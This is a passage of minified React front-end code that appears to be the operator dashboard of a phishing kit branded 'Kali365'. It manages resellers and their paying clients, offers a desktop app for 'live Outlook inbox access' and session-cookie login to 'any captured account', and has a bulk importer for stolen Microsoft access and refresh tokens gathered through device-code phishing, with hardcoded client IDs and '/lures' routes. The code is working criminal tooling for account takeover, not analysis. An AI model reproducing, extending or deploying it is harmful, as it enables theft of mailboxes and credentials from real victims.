            children: e.slug,
          }),
          (0, R.jsx)(`td`, {
            className: `py-2.5 px-3 text-[13px] text-text-secondary`,
            children: e.panel_name || `—`,
          }),
          (0, R.jsx)(`td`, {
            className: `py-2.5 px-3`,
            children: (0, R.jsxs)(`div`, {
              className: `flex items-center gap-1.5`,
              children: [
                (0, R.jsx)(`span`, {
                  className: `text-[12px] text-text-secondary truncate max-w-[180px]`,
                  children: e.domain,
                }),
                (0, R.jsx)(`button`, {
                  onClick: (e) => {
                    (e.stopPropagation(), l());
                  },
                  className: `text-text-muted hover:text-text transition-colors`,
                  children: (0, R.jsx)(Ur, { size: 11 }),
                }),
                (0, R.jsx)(`a`, {
                  href: `https://${e.domain}`,
                  target: `_blank`,
                  rel: `noreferrer`,
                  onClick: (e) => e.stopPropagation(),
                  className: `text-text-muted hover:text-info transition-colors`,
                  children: (0, R.jsx)(Kr, { size: 11 }),
                }),
              ],
            }),
          }),
          (0, R.jsx)(`td`, {
            className: `py-2.5 px-3`,
            children: (0, R.jsx)(la, { status: e.status }),
          }),
          (0, R.jsx)(`td`, {
            className: `py-2.5 px-3`,
            children: (0, R.jsx)(la, {
              color: d ? `success` : `danger`,
              children: d ? `Running` : `Stopped`,
            }),
          }),
          (0, R.jsx)(`td`, {
            className: `py-2.5 px-3 text-[13px] text-text text-center font-semibold`,
            children: e.client_count,
          }),
          (0, R.jsxs)(`td`, {
            className: `py-2.5 px-3 text-[13px] text-text text-center`,
            children: [`$`, e.balance ?? 0],
          }),
          (0, R.jsx)(`td`, {
            className: `py-2 px-3`,
            onClick: (e) => e.stopPropagation(),
            children: (0, R.jsxs)(`div`, {
              className: `flex gap-1`,
              children: [
                (0, R.jsx)(Mc, {
                  label: `Edit`,
                  icon: (0, R.jsx)(Ci, { size: 12 }),
                  onClick: c,
                  color: `text-text-secondary hover:text-info hover:bg-info/10`,
                }),
                u
                  ? (0, R.jsx)(Mc, {
                      label: `Resume`,
                      icon: (0, R.jsx)(gi, { size: 12 }),
                      onClick: o,
                      color: `text-text-secondary hover:text-active hover:bg-active/10`,
                    })
                  : (0, R.jsx)(Mc, {
                      label: `Suspend`,
                      icon: (0, R.jsx)(hi, { size: 12 }),
                      onClick: a,
                      color: `text-text-secondary hover:text-warning hover:bg-warning/10`,
                    }),
                (0, R.jsx)(Mc, {
                  label: `Delete`,
                  icon: (0, R.jsx)(I, { size: 12 }),
                  onClick: s,
                  color: `text-text-secondary hover:text-danger hover:bg-danger/10`,
                }),
              ],
            }),
          }),
        ],
      }),
      t &&
        (0, R.jsx)(`tr`, {
          className: `border-b border-border/40`,
          children: (0, R.jsx)(`td`, {
            colSpan: 9,
            className: `p-0`,
            children: (0, R.jsx)(`div`, {
              className: `bg-bg/50 border-t border-border/30 p-4`,
              children: r
                ? (0, R.jsx)(`div`, {
                    className: `text-text-muted text-xs py-6 text-center`,
                    children: `Loading details...`,
                  })
                : n
                  ? (0, R.jsx)(Pc, { agent: e, detail: n })
                  : (0, R.jsx)(`div`, {
                      className: `text-text-muted text-xs py-6 text-center`,
                      children: `Failed to load`,
                    }),
            }),
          }),
        }),
    ],
  });
}
function Pc({ agent: e, detail: t }) {
  return (0, R.jsxs)(`div`, {
    className: `space-y-4`,
    children: [
      (0, R.jsxs)(`div`, {
        className: `grid grid-cols-2 sm:grid-cols-4 gap-3`,
        children: [
          (0, R.jsx)(Fc, {
            icon: (0, R.jsx)(Ui, { size: 14 }),
            label: `Clients`,
            value: String(t.client_count),
          }),
          (0, R.jsx)(Fc, {
            icon: (0, R.jsx)(Wr, { size: 14 }),
            label: `Balance`,
            value: `$${t.balance ?? 0}`,
          }),
          (0, R.jsx)(Fc, {
            icon: (0, R.jsx)(Wr, { size: 14 }),
            label: `Total Paid`,
            value: `$${t.total_paid ?? 0}`,
          }),
          (0, R.jsx)(Fc, {
            icon: (0, R.jsx)($r, { size: 14 }),
            label: `Theme`,
            value: e.theme || `default`,
          }),
        ],
      }),
      (0, R.jsxs)(`div`, {
        className: `grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs`,
        children: [
          (0, R.jsxs)(`div`, {
            children: [
              (0, R.jsx)(`span`, {
                className: `text-text-muted block text-[10px] uppercase tracking-wider mb-0.5`,
                children: `Username`,
              }),
              (0, R.jsx)(`span`, {
                className: `text-text`,
                children: t.username,
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            children: [
              (0, R.jsx)(`span`, {
                className: `text-text-muted block text-[10px] uppercase tracking-wider mb-0.5`,
                children: `Cost / Client`,
              }),
              (0, R.jsxs)(`span`, {
                className: `text-text`,
                children: [`$`, t.cost_per_client],
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            children: [
              (0, R.jsx)(`span`, {
                className: `text-text-muted block text-[10px] uppercase tracking-wider mb-0.5`,
                children: `Free Clients`,
              }),
              (0, R.jsx)(`span`, {
                className: `text-text`,
                children: t.max_free_clients,
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            children: [
              (0, R.jsx)(`span`, {
                className: `text-text-muted block text-[10px] uppercase tracking-wider mb-0.5`,
                children: `Created`,
              }),
              (0, R.jsx)(`span`, {
                className: `text-text`,
                children: t.created_at
                  ? new Date(t.created_at).toLocaleDateString()
                  : `—`,
              }),
            ],
          }),
        ],
      }),
      t.notes &&
        (0, R.jsxs)(`div`, {
          className: `text-xs`,
          children: [
            (0, R.jsx)(`span`, {
              className: `text-text-muted block text-[10px] uppercase tracking-wider mb-0.5`,
              children: `Notes`,
            }),
            (0, R.jsx)(`span`, {
              className: `text-text-secondary`,
              children: t.notes,
            }),
          ],
        }),
      t.clients &&
        t.clients.length > 0 &&
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsxs)(`h4`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-2`,
              children: [`Clients (`, t.clients.length, `)`],
            }),
            (0, R.jsx)(`div`, {
              className: `bg-surface border border-border overflow-x-auto`,
              children: (0, R.jsxs)(`table`, {
                className: `w-full text-xs`,
                children: [
                  (0, R.jsx)(`thead`, {
                    children: (0, R.jsxs)(`tr`, {
                      className: `border-b border-border`,
                      children: [
                        (0, R.jsx)(`th`, {
                          className: `text-left text-[9px] text-text-muted uppercase tracking-wider py-2 px-3 font-bold`,
                          children: `Username`,
                        }),
                        (0, R.jsx)(`th`, {
                          className: `text-left text-[9px] text-text-muted uppercase tracking-wider py-2 px-3 font-bold`,
                          children: `Display Name`,
                        }),
                        (0, R.jsx)(`th`, {
                          className: `text-left text-[9px] text-text-muted uppercase tracking-wider py-2 px-3 font-bold`,
                          children: `Status`,
                        }),
                        (0, R.jsx)(`th`, {
                          className: `text-left text-[9px] text-text-muted uppercase tracking-wider py-2 px-3 font-bold`,
                          children: `Expires`,
                        }),
                        (0, R.jsx)(`th`, {
                          className: `text-left text-[9px] text-text-muted uppercase tracking-wider py-2 px-3 font-bold`,
                          children: `Joined`,
                        }),
                      ],
                    }),
                  }),
                  (0, R.jsx)(`tbody`, {
                    children: t.clients.map((e) =>
                      (0, R.jsxs)(
                        `tr`,
                        {
                          className: `border-b border-border/30`,
                          children: [
                            (0, R.jsx)(`td`, {
                              className: `py-1.5 px-3 font-medium`,
                              children: e.username,
                            }),
                            (0, R.jsx)(`td`, {
                              className: `py-1.5 px-3 text-text-secondary`,
                              children: e.display_name || `—`,
                            }),
                            (0, R.jsx)(`td`, {
                              className: `py-1.5 px-3`,
                              children: (0, R.jsx)(la, { status: e.status }),
                            }),
                            (0, R.jsx)(`td`, {
                              className: `py-1.5 px-3 text-text-muted`,
                              children: e.subscription_expires || `—`,
                            }),
                            (0, R.jsx)(`td`, {
                              className: `py-1.5 px-3 text-text-muted`,
                              children: e.created_at
                                ? new Date(e.created_at).toLocaleDateString()
                                : `—`,
                            }),
                          ],
                        },
                        e.id,
                      ),
                    ),
                  }),
                ],
              }),
            }),
          ],
        }),
    ],
  });
}
function Fc({ icon: e, label: t, value: n }) {
  return (0, R.jsxs)(`div`, {
    className: `bg-surface border border-border px-3 py-2 flex items-center gap-2.5`,
    children: [
      (0, R.jsx)(`div`, { className: `text-text-muted`, children: e }),
      (0, R.jsxs)(`div`, {
        children: [
          (0, R.jsx)(`div`, {
            className: `text-[9px] text-text-muted uppercase tracking-wider`,
            children: t,
          }),
          (0, R.jsx)(`div`, {
            className: `text-sm font-semibold text-text`,
            children: n,
          }),
        ],
      }),
    ],
  });
}
var Ic = `/downloads/Kali365-Live-Setup.exe`,
  G = `/downloads/Kali365-Live-Setup.dmg`;
function Lc() {
  return (0, R.jsxs)(`div`, {
    children: [
      (0, R.jsx)(`h1`, {
        className: `text-lg font-bold tracking-wider uppercase mb-6`,
        children: `Live Browser`,
      }),
      (0, R.jsx)(`div`, {
        className: `bg-surface border border-border p-8`,
        children: (0, R.jsxs)(`div`, {
          className: `max-w-2xl mx-auto text-center space-y-6`,
          children: [
            (0, R.jsx)(`div`, {
              className: `w-16 h-16 mx-auto rounded-xl bg-active/10 border border-active/20 flex items-center justify-center`,
              children: (0, R.jsx)(fi, {
                size: 28,
                strokeWidth: 1.5,
                className: `text-active`,
              }),
            }),
            (0, R.jsxs)(`div`, {
              children: [
                (0, R.jsx)(`h2`, {
                  className: `text-base font-bold tracking-wide mb-2`,
                  children: `Kali365 Live`,
                }),
                (0, R.jsx)(`p`, {
                  className: `text-sm text-text-secondary max-w-md mx-auto`,
                  children: `Real-time token monitoring with live Outlook inbox access. Get instant notifications when new tokens are captured.`,
                }),
              ],
            }),
            (0, R.jsxs)(`div`, {
              className: `flex flex-col sm:flex-row gap-3 justify-center pt-2`,
              children: [
                (0, R.jsx)(`a`, {
                  href: Ic,
                  download: !0,
                  children: (0, R.jsx)(V, {
                    className: `w-full sm:w-auto`,
                    children: (0, R.jsxs)(`span`, {
                      className: `flex items-center gap-2`,
                      children: [
                        (0, R.jsx)(fi, { size: 16 }),
                        (0, R.jsxs)(`span`, {
                          children: [
                            (0, R.jsx)(`span`, {
                              className: `block text-sm font-bold`,
                              children: `Download for Windows`,
                            }),
                            (0, R.jsx)(`span`, {
                              className: `block text-[10px] opacity-70`,
                              children: `.exe installer`,
                            }),
                          ],
                        }),
                        (0, R.jsx)(Gr, { size: 14 }),
                      ],
                    }),
                  }),
                }),
                (0, R.jsx)(`a`, {
                  href: G,
                  download: !0,
                  children: (0, R.jsx)(V, {
                    variant: `secondary`,
                    className: `w-full sm:w-auto`,
                    children: (0, R.jsxs)(`span`, {
                      className: `flex items-center gap-2`,
                      children: [
                        (0, R.jsx)(wr, { size: 16 }),
                        (0, R.jsxs)(`span`, {
                          children: [
                            (0, R.jsx)(`span`, {
                              className: `block text-sm font-bold`,
                              children: `Download for Mac`,
                            }),
                            (0, R.jsx)(`span`, {
                              className: `block text-[10px] opacity-70`,
                              children: `.dmg installer`,
                            }),
                          ],
                        }),
                        (0, R.jsx)(Gr, { size: 14 }),
                      ],
                    }),
                  }),
                }),
              ],
            }),
            (0, R.jsxs)(`div`, {
              className: `border-t border-border pt-6 mt-6`,
              children: [
                (0, R.jsx)(`h3`, {
                  className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-4`,
                  children: `Features`,
                }),
                (0, R.jsxs)(`div`, {
                  className: `grid grid-cols-1 sm:grid-cols-3 gap-4 text-left`,
                  children: [
                    (0, R.jsx)(Rc, {
                      title: `Real-Time Alerts`,
                      desc: `Instant notifications when new tokens are captured — no delay.`,
                    }),
                    (0, R.jsx)(Rc, {
                      title: `Live Inbox`,
                      desc: `Browse any captured Outlook inbox directly from the app.`,
                    }),
                    (0, R.jsx)(Rc, {
                      title: `One-Click Cookies`,
                      desc: `Generate browser session cookies and login to any captured account.`,
                    }),
                  ],
                }),
              ],
            }),
          ],
        }),
      }),
    ],
  });
}
function Rc({ title: e, desc: t }) {
  return (0, R.jsxs)(`div`, {
    className: `bg-bg border border-border/50 p-4`,
    children: [
      (0, R.jsx)(`div`, {
        className: `text-xs font-bold text-text mb-1`,
        children: e,
      }),
      (0, R.jsx)(`div`, {
        className: `text-[11px] text-text-muted leading-relaxed`,
        children: t,
      }),
    ],
  });
}
function zc(e) {
  try {
    let t = e.split(`.`);
    if (t.length !== 3) return null;
    let n = t[1].replace(/-/g, `+`).replace(/_/g, `/`);
    return JSON.parse(atob(n));
  } catch {
    return null;
  }
}
var Bc = `d3590ed6`,
  Vc = `d3590ed6-52b3-4102-aeff-aad2292ab01c`,
  Hc = `29d9ed98-a469-4536-ade2-f981bc1d605e`;
function Uc(e) {
  let t = (e.capture_mode || ``).toLowerCase(),
    n = (e.client_id || e.clientId || ``).toLowerCase();
  return t === `mailbox` || n.startsWith(Bc)
    ? { capture_mode: `mailbox`, client_id: Vc }
    : (t === `cookies` || n.startsWith(`29d9ed98`),
      { capture_mode: `cookies`, client_id: Hc });
}
function Wc(e) {
  let t = e.token || e.access_token || e.accessToken || ``,
    n = e.refreshToken || e.refresh_token || ``;
  if (!t) return null;
  let r = e.email || e.user_email || e.displayName || ``,
    i = e.displayName || e.user_name || e.name || ``,
    a = e.source || `import`,
    o = e.capturedAt || e.captured_at || ``,
    s = e.ip || ``,
    c = zc(t);
  c &&
    ((r ||= c.upn || c.unique_name || c.preferred_username || c.email || ``),
    (i ||= c.name || ``));
  let { capture_mode: l, client_id: u } = Uc(e);
  return {
    access_token: t,
    refresh_token: n,
    user_email: r,
    user_name: i,
    source: a,
    captured_at: o,
    ip: s,
    capture_mode: l,
    client_id: u,
  };
}
function Gc() {
  let [e, t] = (0, _.useState)(``),
    [n, r] = (0, _.useState)([]),
    [i, a] = (0, _.useState)(``),
    [o, s] = (0, _.useState)(!1),
    [c, l] = (0, _.useState)({ done: 0, total: 0, failed: 0 }),
    [u, d] = (0, _.useState)([]),
    f = z((e) => e.add);
  function p(e) {
    try {
      return JSON.parse(e);
    } catch {
      return null;
    }
  }
  function m() {
    (a(``), d([]));
    let t = e.trim();
    if (!t) {
      a(`Paste token data first`);
      return;
    }
    ((t = t.replace(/,\s*$/, ``)), (t = t.replace(/,(\s*[\]}])/g, `$1`)));
    let n = p(t);
    if (
      (n === null && (n = p(`[` + t + `]`)),
      n === null && (n = p(`[` + t.replace(/}\s*{/g, `},{`) + `]`)),
      n !== null)
    ) {
      let e = (Array.isArray(n) ? n : [n])
        .map((e) => Wc(e))
        .filter((e) => e !== null);
      if (e.length > 0) {
        r(e);
        return;
      }
      a(
        `No valid tokens found — each object needs a 'token' or 'access_token' field`,
      );
      return;
    }
    if (zc(t)) {
      let e = Wc({ token: t });
      if (e) {
        r([e]);
        return;
      }
    }
    a(`Could not parse input — paste a JSON token object, array, or raw JWT`);
  }
  async function h() {
    if (n.length === 0) return;
    (s(!0), l({ done: 0, total: n.length, failed: 0 }), d([]));
    let e = 0,
      t = 0,
      r = [];
    for (let i of n) {
      try {
        (
          await Qa({
            access_token: i.access_token,
            refresh_token: i.refresh_token,
            user_email: i.user_email,
            user_name: i.user_name,
            client_id: i.client_id || void 0,
          })
        ).success
          ? (e++, r.push({ email: i.user_email || `unknown`, ok: !0 }))
          : (t++, r.push({ email: i.user_email || `unknown`, ok: !1 }));
      } catch {
        (t++, r.push({ email: i.user_email || `unknown`, ok: !1 }));
      }
      l({ done: e + t, total: n.length, failed: t });
    }
    (s(!1),
      d(r),
      n.length === 1
        ? f(
            e
              ? `Token imported — ${n[0].user_email || `unknown`}`
              : `Import failed`,
            e ? `success` : `error`,
          )
        : f(
            `Bulk import: ${e} succeeded, ${t} failed`,
            e > 0 ? `success` : `error`,
          ));
  }
  function g() {
    (t(``), r([]), d([]), a(``), l({ done: 0, total: 0, failed: 0 }));
  }
  return (0, R.jsxs)(`div`, {
    children: [
      (0, R.jsx)(`div`, {
        className: `flex items-center justify-between mb-5`,
        children: (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`h1`, {
              className: `text-lg font-bold tracking-wider uppercase`,
              children: `Token Import`,
            }),
            (0, R.jsx)(`p`, {
              className: `text-xs text-text-muted mt-1`,
              children: `Import tokens from Panel Live or other sources — single or bulk.`,
            }),
          ],
        }),
      }),
      (0, R.jsxs)(`div`, {
        className: `grid grid-cols-1 lg:grid-cols-3 gap-5`,
        children: [
          (0, R.jsxs)(`div`, {
            className: `lg:col-span-2 space-y-4`,
            children: [
              n.length === 0 &&
                (0, R.jsxs)(`div`, {
                  className: `bg-surface border border-border p-5`,
                  children: [
                    (0, R.jsx)(`label`, {
                      className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-2`,
                      children: `Paste Token Data`,
                    }),
                    (0, R.jsx)(`textarea`, {
                      value: e,
                      onChange: (e) => {
                        (t(e.target.value), a(``));
                      },
                      rows: 16,
                      placeholder: `Paste a single token or an array for bulk import:

[
  {
    "token": "eyJ0eXAi...",
    "refreshToken": "1.AX0...",
    "email": "user@corp.com",
    "displayName": "user@corp.com",
    "source": "device_code",
    "capturedAt": "2026-03-26T14:15:10Z"
  },
  ...
]`,
                      className: `w-full bg-bg border border-border text-text px-3 py-2.5 text-sm font-mono focus:outline-none focus:border-border-light resize-y`,
                    }),
                    i &&
                      (0, R.jsxs)(`div`, {
                        className: `flex items-center gap-2 text-xs mt-2 text-danger`,
                        children: [
                          (0, R.jsx)(`span`, {
                            className: `inline-block w-2 h-2 rounded-full bg-danger`,
                          }),
                          i,
                        ],
                      }),
                    (0, R.jsxs)(`div`, {
                      className: `flex gap-2 mt-4`,
                      children: [
                        (0, R.jsx)(V, {
                          onClick: m,
                          children: (0, R.jsxs)(`span`, {
                            className: `flex items-center gap-1.5`,
                            children: [
                              (0, R.jsx)(Yr, { size: 13 }),
                              ` Parse Tokens`,
                            ],
                          }),
                        }),
                        (0, R.jsx)(V, {
                          variant: `secondary`,
                          onClick: g,
                          children: `Clear`,
                        }),
                      ],
                    }),
                  ],
                }),
              n.length > 0 &&
                !u.length &&
                (0, R.jsxs)(`div`, {
                  className: `bg-surface border border-border`,
                  children: [
                    (0, R.jsxs)(`div`, {
                      className: `px-5 py-3 border-b border-border flex items-center justify-between`,
                      children: [
                        (0, R.jsx)(`div`, {
                          children: (0, R.jsx)(`h3`, {
                            className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
                            children:
                              n.length === 1
                                ? `1 Token Detected`
                                : `${n.length} Tokens Detected`,
                          }),
                        }),
                        (0, R.jsxs)(`div`, {
                          className: `flex gap-2`,
                          children: [
                            (0, R.jsx)(V, {
                              size: `sm`,
                              onClick: h,
                              disabled: o,
                              children: (0, R.jsxs)(`span`, {
                                className: `flex items-center gap-1.5`,
                                children: [
                                  (0, R.jsx)(Li, { size: 12 }),
                                  o
                                    ? `Importing ${c.done}/${c.total}...`
                                    : n.length === 1
                                      ? `Import Token`
                                      : `Import All ${n.length}`,
                                ],
                              }),
                            }),
                            (0, R.jsx)(V, {
                              size: `sm`,
                              variant: `secondary`,
                              onClick: g,
                              disabled: o,
                              children: (0, R.jsxs)(`span`, {
                                className: `flex items-center gap-1.5`,
                                children: [
                                  (0, R.jsx)(I, { size: 12 }),
                                  ` Clear`,
                                ],
                              }),
                            }),
                          ],
                        }),
                      ],
                    }),
                    o &&
                      (0, R.jsxs)(`div`, {
                        className: `px-5 py-2 border-b border-border`,
                        children: [
                          (0, R.jsxs)(`div`, {
                            className: `flex justify-between text-[10px] text-text-muted mb-1`,
                            children: [
                              (0, R.jsxs)(`span`, {
                                children: [`Importing `, c.done, `/`, c.total],
                              }),
                              c.failed > 0 &&
                                (0, R.jsxs)(`span`, {
                                  className: `text-danger`,
                                  children: [c.failed, ` failed`],
                                }),
                            ],
                          }),
                          (0, R.jsx)(`div`, {
                            className: `w-full h-1.5 bg-border rounded-full overflow-hidden`,
                            children: (0, R.jsx)(`div`, {
                              className: `h-full bg-active transition-all duration-300`,
                              style: {
                                width: `${c.total > 0 ? (c.done / c.total) * 100 : 0}%`,
                              },
                            }),
                          }),
                        ],
                      }),
                    (0, R.jsx)(`div`, {
                      className: `max-h-[480px] overflow-y-auto`,
                      children: (0, R.jsxs)(`table`, {
                        className: `w-full text-left text-sm`,
                        children: [
                          (0, R.jsx)(`thead`, {
                            className: `sticky top-0 bg-surface`,
                            children: (0, R.jsxs)(`tr`, {
                              className: `border-b border-border text-[10px] text-text-muted uppercase tracking-wider`,
                              children: [
                                (0, R.jsx)(`th`, {
                                  className: `px-5 py-2 font-bold`,
                                  children: `#`,
                                }),
                                (0, R.jsx)(`th`, {
                                  className: `px-5 py-2 font-bold`,
                                  children: `Email`,
                                }),
                                (0, R.jsx)(`th`, {
                                  className: `px-5 py-2 font-bold`,
                                  children: `Type`,
                                }),
                                (0, R.jsx)(`th`, {
                                  className: `px-5 py-2 font-bold`,
                                  children: `Source`,
                                }),
                                (0, R.jsx)(`th`, {
                                  className: `px-5 py-2 font-bold`,
                                  children: `Captured`,
                                }),
                                (0, R.jsx)(`th`, {
                                  className: `px-5 py-2 font-bold`,
                                  children: `IP`,
                                }),
                              ],
                            }),
                          }),
                          (0, R.jsx)(`tbody`, {
                            children: n.map((e, t) =>
                              (0, R.jsxs)(
                                `tr`,
                                {
                                  className: `border-b border-border/30 hover:bg-white/[0.01]`,
                                  children: [
                                    (0, R.jsx)(`td`, {
                                      className: `px-5 py-2 text-text-muted text-xs`,
                                      children: t + 1,
                                    }),
                                    (0, R.jsx)(`td`, {
                                      className: `px-5 py-2 text-text font-mono text-xs`,
                                      children: e.user_email || `—`,
                                    }),
                                    (0, R.jsx)(`td`, {
                                      className: `px-5 py-2`,
                                      children:
                                        e.capture_mode === `mailbox`
                                          ? (0, R.jsx)(`span`, {
                                              className: `inline-flex items-center px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-wider bg-blue-100 text-blue-700 border border-blue-200`,
                                              children: `Mailbox`,
                                            })
                                          : (0, R.jsx)(`span`, {
                                              className: `inline-flex items-center px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-wider bg-orange-100 text-orange-700 border border-orange-200`,
                                              children: `Cookies`,
                                            }),
                                    }),
                                    (0, R.jsx)(`td`, {
                                      className: `px-5 py-2`,
                                      children: (0, R.jsx)(`span`, {
                                        className: `text-[10px] bg-slate-50 border border-border px-2 py-0.5 text-text-secondary`,
                                        children: e.source,
                                      }),
                                    }),
                                    (0, R.jsx)(`td`, {
                                      className: `px-5 py-2 text-text-muted text-xs`,
                                      children: e.captured_at
                                        ? new Date(
                                            e.captured_at,
                                          ).toLocaleDateString()
                                        : `—`,
                                    }),
                                    (0, R.jsx)(`td`, {
                                      className: `px-5 py-2 text-text-muted text-xs font-mono`,
                                      children: e.ip || `—`,
                                    }),
                                  ],
                                },
                                t,
                              ),
                            ),
                          }),
                        ],
                      }),
                    }),
                  ],
                }),
              u.length > 0 &&
                (0, R.jsxs)(`div`, {
                  className: `bg-surface border border-border`,
                  children: [
                    (0, R.jsxs)(`div`, {
                      className: `px-5 py-3 border-b border-border flex items-center justify-between`,
                      children: [
                        (0, R.jsx)(`h3`, {
                          className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
                          children: `Import Results`,
                        }),
                        (0, R.jsx)(V, {
                          size: `sm`,
                          variant: `secondary`,
                          onClick: g,
                          children: `Import More`,
                        }),
                      ],
                    }),
                    (0, R.jsx)(`div`, {
                      className: `max-h-[400px] overflow-y-auto`,
                      children: u.map((e, t) =>
                        (0, R.jsxs)(
                          `div`,
                          {
                            className: `flex items-center gap-3 px-5 py-2 border-b border-border/30 text-sm`,
                            children: [
                              (0, R.jsx)(`span`, {
                                className: `inline-block w-2 h-2 rounded-full ${e.ok ? `bg-active` : `bg-danger`}`,
                              }),
                              (0, R.jsx)(`span`, {
                                className: `font-mono text-xs ${e.ok ? `text-text` : `text-text-muted`}`,
                                children: e.email,
                              }),
                              (0, R.jsx)(`span`, {
                                className: `text-[10px] uppercase tracking-wider font-bold ml-auto ${e.ok ? `text-active` : `text-danger`}`,
                                children: e.ok ? `Imported` : `Failed`,
                              }),
                            ],
                          },
                          t,
                        ),
                      ),
                    }),
                  ],
                }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `space-y-4`,
            children: [
              (0, R.jsxs)(`div`, {
                className: `bg-surface border border-border p-5`,
                children: [
                  (0, R.jsx)(`h3`, {
                    className: `text-xs font-bold uppercase tracking-wider text-text-muted mb-3`,
                    children: `Supported Formats`,
                  }),
                  (0, R.jsxs)(`div`, {
                    className: `space-y-4 text-xs text-text-secondary leading-relaxed`,
                    children: [
                      (0, R.jsxs)(`div`, {
                        children: [
                          (0, R.jsx)(`div`, {
                            className: `text-[10px] text-active uppercase tracking-wider font-bold mb-1`,
                            children: `Telegram File Format`,
                          }),
                          (0, R.jsx)(`code`, {
                            className: `block bg-bg border border-border px-2.5 py-2 font-mono text-[11px] text-text-muted whitespace-pre`,
                            children: `{
  "token": "eyJ0...",
  "refreshToken": "1.AX0...",
  "email": "user@corp.com",
  "displayName": "...",
  "capture_mode": "mailbox",
  "client_id": "d3590ed6-...",
  "source": "device_code",
  "capturedAt": "2026-04-27T..."
}`,
                          }),
                        ],
                      }),
                      (0, R.jsxs)(`div`, {
                        children: [
                          (0, R.jsx)(`div`, {
                            className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-1`,
                            children: `Panel Export Format`,
                          }),
                          (0, R.jsx)(`code`, {
                            className: `block bg-bg border border-border px-2.5 py-2 font-mono text-[11px] text-text-muted whitespace-pre`,
                            children: `{
  "access_token": "eyJ0...",
  "refresh_token": "1.AX0...",
  "user_email": "..."
}`,
                          }),
                        ],
                      }),
                      (0, R.jsxs)(`div`, {
                        children: [
                          (0, R.jsx)(`div`, {
                            className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-1`,
                            children: `Raw JWT`,
                          }),
                          (0, R.jsx)(`code`, {
                            className: `block bg-bg border border-border px-2.5 py-2 font-mono text-[11px] text-text-muted`,
                            children: `eyJ0eXAiOiJKV1Qi...`,
                          }),
                        ],
                      }),
                    ],
                  }),
                ],
              }),
              (0, R.jsxs)(`div`, {
                className: `bg-surface border border-border p-5`,
                children: [
                  (0, R.jsx)(`h3`, {
                    className: `text-xs font-bold uppercase tracking-wider text-text-muted mb-3`,
                    children: `How It Works`,
                  }),
                  (0, R.jsxs)(`ol`, {
                    className: `text-xs text-text-secondary leading-relaxed space-y-2 list-decimal list-inside`,
                    children: [
                      (0, R.jsxs)(`li`, {
                        children: [
                          `Paste a single token object or wrap multiple in `,
                          (0, R.jsx)(`code`, {
                            className: `text-text-muted`,
                            children: `[...]`,
                          }),
                          ` for bulk`,
                        ],
                      }),
                      (0, R.jsxs)(`li`, {
                        children: [
                          `Click `,
                          (0, R.jsx)(`strong`, {
                            className: `text-text`,
                            children: `Parse`,
                          }),
                          ` to detect and preview`,
                        ],
                      }),
                      (0, R.jsxs)(`li`, {
                        children: [
                          `Review the list, then `,
                          (0, R.jsx)(`strong`, {
                            className: `text-text`,
                            children: `Import All`,
                          }),
                        ],
                      }),
                    ],
                  }),
                ],
              }),
              (0, R.jsxs)(`div`, {
                className: `bg-surface border border-border p-5`,
                children: [
                  (0, R.jsx)(`h3`, {
                    className: `text-xs font-bold uppercase tracking-wider text-text-muted mb-3`,
                    children: `Auto-Detection`,
                  }),
                  (0, R.jsxs)(`p`, {
                    className: `text-xs text-text-secondary leading-relaxed`,
                    children: [
                      `Email and name are extracted from the JSON fields or from JWT claims (`,
                      (0, R.jsx)(`code`, {
                        className: `text-text-muted`,
                        children: `upn`,
                      }),
                      `, `,
                      (0, R.jsx)(`code`, {
                        className: `text-text-muted`,
                        children: `unique_name`,
                      }),
                      `, `,
                      (0, R.jsx)(`code`, {
                        className: `text-text-muted`,
                        children: `email`,
                      }),
                      `).`,
                    ],
                  }),
                ],
              }),
            ],
          }),
        ],
      }),
    ],
  });
}
function Kc({ children: e }) {
  let t = er((e) => e.user);
  return er((e) => e.loading)
    ? (0, R.jsx)(`div`, {
        className: `min-h-screen flex items-center justify-center bg-bg`,
        children: (0, R.jsx)(`div`, {
          className: `text-text-muted text-sm tracking-widest uppercase`,
          children: `Loading...`,
        }),
      })
    : t
      ? (0, R.jsx)(R.Fragment, { children: e })
      : (0, R.jsx)(Ft, { to: `/login`, replace: !0 });
}
function qc({ children: e }) {
  return er((e) => e.user)?.role === `admin`
    ? (0, R.jsx)(R.Fragment, { children: e })
    : (0, R.jsx)(Ft, { to: `/`, replace: !0 });
}
function Jc({ children: e }) {
  let t = er((e) => e.user);
  return t?.role !== `agent` && t?.role !== `admin`
    ? (0, R.jsx)(Ft, { to: `/`, replace: !0 })
    : (0, R.jsx)(R.Fragment, { children: e });
}
function Yc() {
  let e = er((e) => e.setUser),
    t = rr((e) => e.fetchBranding);
  return (
    (0, _.useEffect)(() => {
      (t(),
        ar()
          .then(e)
          .catch(() => e(null)));
    }, []),
    (0, R.jsx)(Dn, {
      children: (0, R.jsxs)(zt, {
        children: [
          (0, R.jsx)(Lt, { path: `/login`, element: (0, R.jsx)(aa, {}) }),
          (0, R.jsxs)(Lt, {
            element: (0, R.jsx)(Kc, { children: (0, R.jsx)(ia, {}) }),
            children: [
              (0, R.jsx)(Lt, { path: `/`, element: (0, R.jsx)(Ua, {}) }),
              (0, R.jsx)(Lt, { path: `/tokens`, element: (0, R.jsx)(no, {}) }),
              (0, R.jsx)(Lt, {
                path: `/import`,
                element: (0, R.jsx)(qc, { children: (0, R.jsx)(Gc, {}) }),
              }),
              (0, R.jsx)(Lt, { path: `/lures`, element: (0, R.jsx)(bo, {}) }),
              (0, R.jsx)(Lt, {
                path: `/live`,
                element: (0, R.jsx)(qc, { children: (0, R.jsx)(Lc, {}) }),
              }),
              (0, R.jsx)(Lt, {
                path: `/settings`,
                element: (0, R.jsx)(To, {}),
              }),
